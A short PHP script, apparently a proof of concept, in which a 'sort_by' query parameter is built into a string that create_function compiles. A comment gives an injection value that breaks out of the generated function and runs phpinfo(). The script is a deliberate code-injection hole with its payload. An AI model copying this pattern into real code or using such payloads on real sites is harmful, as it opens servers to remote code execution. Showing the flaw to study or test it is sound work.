<?php
# call as test.php?sort_by="]);}phpinfo();/*
$sort_by=stripslashes($_GET[sort_by]);
$databases=array("test");
$sorter = 'var_dump';
$sort_function = ' return ' . ($sort_order == 'ASC' ? 1 : -1) . ' * ' . $sorter . '($a["' . $sort_by . '"], $b["' . $sort_by . '"]); ';


usort($databases, create_function('$a, $b', $sort_function));

?>
